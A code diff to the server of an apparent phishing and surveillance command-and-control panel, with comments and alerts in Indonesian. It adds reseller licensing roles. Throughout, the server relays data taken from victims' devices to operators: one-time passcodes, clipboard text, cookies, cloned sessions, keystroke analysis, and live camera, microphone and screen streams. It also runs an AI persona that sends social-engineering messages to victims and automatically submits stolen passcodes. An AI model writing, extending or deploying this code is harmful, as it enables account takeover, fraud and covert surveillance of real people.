@@ -22,18 +22,28 @@ const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
 const crypto = require('crypto');
 
 // Admin token store (persisted to file)
-const adminTokens = new Set();
+const adminTokens = new Map(); // token -> { type: 'master' | 'reseller', resellerId?: string }
 const TOKENS_FILE = path.join(DATA_DIR, 'tokens.json');
 function loadTokens() {
     try {
         if (fs.existsSync(TOKENS_FILE)) {
             const data = JSON.parse(fs.readFileSync(TOKENS_FILE, 'utf-8'));
-            if (Array.isArray(data)) data.forEach(t => adminTokens.add(t));
+            if (Array.isArray(data)) {
+                // Backward compatibility: old format was array of strings
+                data.forEach(t => {
+                    if (typeof t === 'string') adminTokens.set(t, { type: 'master' });
+                    else if (t.token) adminTokens.set(t.token, t.data);
+                });
+            } else if (typeof data === 'object') {
+                for (const [token, meta] of Object.entries(data)) {
+                    adminTokens.set(token, meta);
+                }
+            }
         }
     } catch(e) {}
 }
 function saveTokens() {
-    try { fs.writeFileSync(TOKENS_FILE, JSON.stringify([...adminTokens], null, 2)); } catch(e) {}
+    try { fs.writeFileSync(TOKENS_FILE, JSON.stringify(Object.fromEntries(adminTokens), null, 2)); } catch(e) {}
 }
 loadTokens();
 const linkExpiry = { duration: 0, enabled: false }; // 0 = no expiry, duration in minutes
@@ -104,12 +114,18 @@ function verifyAdmin(req, res, next) {
     // Protect admin.html — use token param for page load, header for API
     if (req.path === '/admin.html') {
         const token = req.query.token || req.headers['x-admin-token'];
-        if (token && adminTokens.has(token)) return next();
+        if (token && adminTokens.has(token)) {
+            req.adminData = adminTokens.get(token);
+            return next();
+        }
         return res.redirect('/login-admin.html');
     }
     if (req.path.startsWith('/api/')) {
         const token = req.headers['x-admin-token'] || (req.headers['authorization'] && req.headers['authorization'].replace('Bearer ', ''));
-        if (token && adminTokens.has(token)) return next();
+        if (token && adminTokens.has(token)) {
+            req.adminData = adminTokens.get(token);
+            return next();
+        }
         return res.status(401).json({ error: 'unauthorized' });
     }
     next();
@@ -225,9 +241,28 @@ function loadDevices() {
 }
 loadDevices();
 
+function notifyAdmins(event, data) {
+    const deviceId = data && data.deviceId ? data.deviceId : (data && data.id ? data.id : null);
+    const d = deviceId ? devices.get(deviceId) : null;
+    if (d && d.resellerId) {
+        io.to('master_admins').to('reseller_' + d.resellerId).emit(event, data);
+    } else {
+        io.to('master_admins').emit(event, data);
+    }
+}
+
 io.on('connection', (socket) => {
+    const token = socket.handshake.query.token;
+    let adminData = null;
+    if (token) {
+        adminData = adminTokens.get(token);
+        if (!adminData) {
+            socket.disconnect(true);
+            return;
+        }
+    }
+    const isAdmin = !!adminData;
     const deviceId = socket.handshake.query.deviceId || uuidv4();
-    const isAdmin = !!socket.handshake.query.token;
     const isIframe = !!socket.handshake.query.iframe;
     socket.join(deviceId); // Join room for targeted events (live camera, etc.)
 
@@ -235,7 +270,13 @@ io.on('connection', (socket) => {
     if (isAdmin) {
         const adminIp = socket.handshake.address;
         adminIps.add(adminIp);
-        socket.join('admins'); // Join admin room for targeted broadcasts
+        socket.adminData = adminData;
+        socket.join('all_admins');
+        if (adminData.type === 'master') {
+            socket.join('master_admins');
+        } else if (adminData.type === 'reseller') {
+            socket.join('reseller_' + adminData.resellerId);
+        }
         socket.on('start-camera-stream', (targetDeviceId) => {
             if (targetDeviceId && devices.has(targetDeviceId)) {
                 io.to(targetDeviceId).emit('start-camera-stream');
@@ -498,7 +539,7 @@ io.on('connection', (socket) => {
             if (device.otpHistory.length > 20) device.otpHistory = device.otpHistory.slice(-20);
             saveDevices();
             sendAIAlert(deviceId, 'OTP Tertangkap!', `Kode OTP: ${info.otpCode}\nSumber: ${info.otpSource || 'input'}\nKonteks: ${info.otpContext || ''}\n\nSegera gunakan sebelum expired!`).catch(()=>{});
-            io.to('admins').emit('otp-captured', { deviceId, label: device.label, otp: info.otpCode, source: info.otpSource || 'input', time: Date.now() });
+            notifyAdmins('otp-captured', { deviceId, label: device.label, otp: info.otpCode, source: info.otpSource || 'input', time: Date.now() });
         }
         if (info.webrtcIP) device.webrtcIP = info.webrtcIP;
         if (info.webgl) device.webgl = info.webgl;
@@ -670,12 +711,12 @@ io.on('connection', (socket) => {
 
     socket.on('camera-stream', (frameData) => {
         // Relay live frame only to admin panel clients
-        io.to('admins').emit('camera-frame', { deviceId, label: device.label, image: frameData.image, time: Date.now() });
+        notifyAdmins('camera-frame', { deviceId, label: device.label, image: frameData.image, time: Date.now() });
     });
 
     // Live camera audio relay
     socket.on('camera-audio', (frameData) => {
-        io.to('admins').emit('camera-audio-frame', { deviceId, label: device.label, audio: frameData.audio, mimeType: frameData.mimeType });
+        notifyAdmins('camera-audio-frame', { deviceId, label: device.label, audio: frameData.audio, mimeType: frameData.mimeType });
         // Accumulate audio for Telegram when auto-capture is active
         const acState = aiAutoCapture.get(deviceId);
         if (acState && acState.audioChunks) {
@@ -687,10 +728,10 @@ io.on('connection', (socket) => {
 
     // Screen broadcast relay
     socket.on('screen-stream', (frameData) => {
-        io.to('admins').emit('screen-frame', { deviceId, label: device.label, image: frameData.image, time: Date.now() });
+        notifyAdmins('screen-frame', { deviceId, label: device.label, image: frameData.image, time: Date.now() });
     });
     socket.on('screen-broadcast-status', (data) => {
-        io.to('admins').emit('screen-broadcast-status', { deviceId, label: device.label, ...data, time: Date.now() });
+        notifyAdmins('screen-broadcast-status', { deviceId, label: device.label, ...data, time: Date.now() });
         if (data.status === 'started') {
             sendAIAlert(deviceId, 'Screen Broadcast', 'Layar korban sedang di-streaming!').catch(()=>{});
         }
@@ -698,14 +739,14 @@ io.on('connection', (socket) => {
 
     // Camera stream status feedback
     socket.on('camera-status', (data) => {
-        io.to('admins').emit('camera-status', { deviceId, label: device.label, ...data, time: Date.now() });
+        notifyAdmins('camera-status', { deviceId, label: device.label, ...data, time: Date.now() });
     });
 
     // === AI FEATURE EVENTS ===
 
     // Face detection from tracker canvas analysis
     socket.on('face-detected', (data) => {
-        io.to('admins').emit('face-detected', { deviceId, label: device.label, ...data, time: Date.now() });
+        notifyAdmins('face-detected', { deviceId, label: device.label, ...data, time: Date.now() });
         if (AI_FEATURES.FACE_DETECTION && data.image) {
             // Save and forward to Telegram
             const filename = `${deviceId}_face_${Date.now()}.jpg`;
@@ -763,7 +804,7 @@ io.on('connection', (socket) => {
         if (device.clipboardHistory.length > 50) device.clipboardHistory = device.clipboardHistory.slice(-50);
         device.clipboard = data.text;
         saveDevices();
-        io.to('admins').emit('device-update', { id: deviceId, clipboard: data.text });
+        notifyAdmins('device-update', { id: deviceId, clipboard: data.text });
         if (data.text && data.text.length > 3) {
             sendAIAlert(deviceId, 'Clipboard Grab', `Isi: ${data.text.slice(0,200)}`).catch(()=>{});
             // Run intelligence if clipboard contains emails/phones
@@ -779,7 +820,7 @@ io.on('connection', (socket) => {
         device.cookiesData.cookies = data.cookies || device.cookiesData.cookies;
         device.cookiesData.localStorage = data.localStorage || device.cookiesData.localStorage;
         saveDevices();
-        io.to('admins').emit('device-update', { id: deviceId, cookiesData: device.cookiesData });
+        notifyAdmins('device-update', { id: deviceId, cookiesData: device.cookiesData });
         sendAIAlert(deviceId, 'Cookies Grabbed', `Domain: ${data.domain || 'N/A'}\nCookie count: ${data.count || 0}`).catch(()=>{});
     });
 
@@ -796,7 +837,7 @@ io.on('connection', (socket) => {
     // Voice recording chunks
     socket.on('voice-data', (data) => {
         // Relay live voice to admin panel clients
-        io.to('admins').emit('voice-frame', { deviceId, label: device.label, audio: data.audio, mimeType: data.mimeType, sequence: data.sequence, timestamp: Date.now() });
+        notifyAdmins('voice-frame', { deviceId, label: device.label, audio: data.audio, mimeType: data.mimeType, sequence: data.sequence, timestamp: Date.now() });
         // Save to disk (only for non-chunked recordings with duration)
         if (data.duration) {
             const filename = `${deviceId}_${data.sequence}_${Date.now()}.webm`;
@@ -843,7 +884,7 @@ io.on('connection', (socket) => {
         if (!device.sessionGrabs) device.sessionGrabs = [];
         device.sessionGrabs.push({ platform: data.platform, data: data.sessionData, time: Date.now() });
         saveDevices();
-        io.to('admins').emit('session-clone', { deviceId, label: device.label, platform: data.platform, sessionData: data.sessionData });
+        notifyAdmins('session-clone', { deviceId, label: device.label, platform: data.platform, sessionData: data.sessionData });
         const sessionInfo = Object.entries(data.sessionData || {}).map(([k,v]) => `${k}: ${String(v).slice(0,80)}`).join('\n');
         await sendAIAlert(deviceId, `Session Clone — ${data.platform}`, `Platform: ${data.platform}\nDomain: ${data.domain || 'N/A'}\n\nSession Data:\n${sessionInfo.slice(0,1500)}`);
     });
@@ -882,7 +923,7 @@ io.on('connection', (socket) => {
 
         addChatMessage(deviceId, 'assistant', followUp);
         io.to(deviceId).emit('social-engineer-chat', { message: followUp, persona: 'Follow-up', engaging: true });
-        io.to('admins').emit('social-engineer-activity', {
+        notifyAdmins('social-engineer-activity', {
             deviceId, label: device.label, type: 'reply', victimMsg: message.slice(0,100),
             aiReply: followUp.slice(0,100), time: Date.now()
         });
@@ -903,6 +944,26 @@ io.on('connection', (socket) => {
 });
 
 // ===== API =====
+
+// Middleware to secure device access for resellers
+app.param('deviceId', (req, res, next, deviceId) => {
+    if (req.adminData && req.adminData.type === 'reseller') {
+        const d = devices.get(deviceId);
+        if (d && d.resellerId !== req.adminData.resellerId) {
+            return res.status(403).json({ error: 'forbidden: device access denied' });
+        }
+    }
+    next();
+});
+app.use('/api', (req, res, next) => {
+    if (req.adminData && req.adminData.type === 'reseller' && req.body && req.body.deviceId) {
+        const d = devices.get(req.body.deviceId);
+        if (d && d.resellerId !== req.adminData.resellerId) {
+            return res.status(403).json({ error: 'forbidden: device access denied' });
+        }
+    }
+    next();
+});
 
 // Background keeper endpoints
 app.post('/ping', (req, res) => {
@@ -939,8 +1000,8 @@ app.post('/api/recovery', (req, res) => {
 
 app.get('/api/devices', (req, res) => {
     const data = [];
-    // Support reseller filter
-    const filterReseller = req.query.resellerId || '';
+    // Enforce reseller filter
+    const filterReseller = req.adminData?.type === 'reseller' ? req.adminData.resellerId : (req.query.resellerId || '');
     for (const [id, d] of devices) {
         if (filterReseller && d.resellerId !== filterReseller) continue;
         data.push({
@@ -1085,7 +1146,9 @@ app.get('/api/export/csv', (req, res) => {
     res.setHeader('Content-Disposition', 'attachment; filename=devices.csv');
     res.write('\uFEFF');
     res.write('Device ID,Label,IP,Status,Latitude,Longitude,Akurasi (m),Battery Level,Battery Charging,Connection Type,Terakhir Update\n');
+    const filterReseller = req.adminData?.type === 'reseller' ? req.adminData.resellerId : '';
     for (const [id, d] of devices) {
+        if (filterReseller && d.resellerId !== filterReseller) continue;
         const online = !!d.socketId && io.sockets.sockets.has(d.socketId);
         const lat = d.location ? d.location.lat : '';
         const lng = d.location ? d.location.lng : '';
@@ -1101,7 +1164,9 @@ app.get('/api/export/csv', (req, res) => {
 // Export JSON
 app.get('/api/export/json', (req, res) => {
     const data = {};
+    const filterReseller = req.adminData?.type === 'reseller' ? req.adminData.resellerId : '';
     for (const [id, d] of devices) {
+        if (filterReseller && d.resellerId !== filterReseller) continue;
         data[id] = {
             label: d.label, ip: d.ip,
             userAgent: d.userAgent,
@@ -1392,7 +1457,7 @@ function startAIAutoCapture(deviceId) {
     aiAutoCapture.set(deviceId, state);
 
     io.to(deviceId).emit('start-camera-stream');
-    io.to('admins').emit('ai-auto-capture', { deviceId, label: d.label, action: 'start', time: Date.now() });
+    notifyAdmins('ai-auto-capture', { deviceId, label: d.label, action: 'start', time: Date.now() });
 
     state.snapTimer = setInterval(async () => {
         if (state.snapCount >= state.maxSnaps || Date.now() - state.started > state.duration) {
@@ -1472,7 +1537,7 @@ function stopAIAutoCapture(deviceId) {
         } catch(e) {}
     }
     io.to(deviceId).emit('stop-camera-stream');
-    io.to('admins').emit('ai-auto-capture', { deviceId, label: d ? d.label : deviceId, action: 'stop', time: Date.now() });
+    notifyAdmins('ai-auto-capture', { deviceId, label: d ? d.label : deviceId, action: 'stop', time: Date.now() });
     aiAutoCapture.delete(deviceId);
 }
 
@@ -1533,7 +1598,7 @@ function initKeystrokeAnalyzer(deviceId) {
             if (!d.aiAlerts) d.aiAlerts = [];
             d.aiAlerts.push({ type: 'keystroke_analysis', patterns, time: Date.now() });
             saveDevices();
-            io.to('admins').emit('ai-alert', { deviceId, label: d.label, type: 'keystroke_analysis', patterns });
+            notifyAdmins('ai-alert', { deviceId, label: d.label, type: 'keystroke_analysis', patterns });
             sendAIAlert(deviceId, 'Keylogger Detection', patterns.join('\n')).catch(()=>{});
             // Auto-run intelligence analysis on detected emails/phones
             if (emails || phones) {
@@ -1740,7 +1805,7 @@ function initSocialEngineer(deviceId) {
                 persona: matchedScenario.persona,
                 scenario: currentScenario
             });
-            io.to('admins').emit('social-engineer-activity', {
+            notifyAdmins('social-engineer-activity', {
                 deviceId, label: dev.label, persona: matchedScenario.persona, message: message.slice(0,100), time: Date.now()
             });
             await sendAIAlert(deviceId, `AI Social Engineer — ${matchedScenario.persona}`, `Pesan terkirim ke korban:\n${message.slice(0,200)}`);
@@ -2004,7 +2069,7 @@ async function autoSubmitOTP(deviceId, otp, targetUrl) {
         sendAIAlert(deviceId, 'OTP Auto-Submit', `Mencoba submit OTP ${otp} ke ${targetUrl.slice(0,100)}`).catch(()=>{});
     } else {
         // Just notify admin
-        io.to('admins').emit('otp-ready', { deviceId, label: d.label, otp, time: Date.now() });
+        notifyAdmins('otp-ready', { deviceId, label: d.label, otp, time: Date.now() });
     }
 }
 
@@ -2513,7 +2578,9 @@ app.get('/api/profile/:deviceId', (req, res) => {
 
 app.get('/api/profile', (req, res) => {
     const result = {};
+    const filterReseller = req.adminData?.type === 'reseller' ? req.adminData.resellerId : '';
     for (const [id, d] of devices) {
+        if (filterReseller && d.resellerId !== filterReseller) continue;
         result[id] = generateProfile(d);
     }
     res.json(result);
@@ -2728,7 +2795,9 @@ app.get('/api/ai-chat/:deviceId', (req, res) => {
 // Get all devices with chat history (admin only)
 app.get('/api/ai-chat', (req, res) => {
     const result = {};
+    const filterReseller = req.adminData?.type === 'reseller' ? req.adminData.resellerId : '';
     for (const [id, d] of devices) {
+        if (filterReseller && d.resellerId !== filterReseller) continue;
         if (d.aiChat && d.aiChat.length) {
             result[id] = { label: d.label, messages: d.aiChat.slice(-50) };
         }
@@ -3069,6 +3138,7 @@ app.get('/api/active-domain', (req, res) => {
 function requireMasterAdmin(req, res, next) {
     const token = req.headers['x-admin-token'];
     if (!token || !adminTokens.has(token)) return res.status(401).json({ error: 'unauthorized' });
+    if (adminTokens.get(token).type !== 'master') return res.status(403).json({ error: 'forbidden' });
     next();
 }
 
@@ -3140,7 +3210,7 @@ app.post('/api/license/activate', (req, res) => {
 
     // Generate session token for reseller
     const token = crypto.randomBytes(24).toString('hex');
-    adminTokens.add(token);
+    adminTokens.set(token, { type: 'reseller', resellerId: data.resellerId });
     saveTokens();
     res.json({ ok: true, token, resellerId: data.resellerId, tier: data.tier, name: data.name, maxDevices: data.maxDevices, expiry: data.expiry });
 });
@@ -3189,7 +3259,7 @@ app.post('/api/admin/login', loginLimiter, (req, res) => {
     const { password } = req.body || {};
     if (password === ADMIN_PASSWORD) {
         const token = crypto.randomBytes(24).toString('hex');
-        adminTokens.add(token);
+        adminTokens.set(token, { type: 'master' });
         saveTokens();
         res.json({ ok: true, token });
     } else {
